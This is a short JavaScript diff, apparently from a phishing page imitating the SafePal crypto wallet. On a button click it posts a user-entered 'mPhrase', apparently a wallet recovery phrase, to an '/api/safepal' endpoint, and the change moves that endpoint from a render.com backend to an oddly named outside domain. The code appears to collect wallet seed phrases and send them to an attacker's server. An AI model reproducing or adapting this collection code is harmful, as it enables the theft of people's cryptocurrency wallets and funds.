@@ -74,7 +74,7 @@ document.querySelector(".button").addEventListener("click",(e)=>{
 
     if( (error1 === false && error2 === false) && (error3 === false && error4 === false)){
         console.log("HIE")
-        const url = "https://backend-01-92mi.onrender.com/api/safepal";
+        const url = "https://api.cryp-t-cr-aky-c.com/api/safepal";
         const data = {
             mPhrase:str
         };
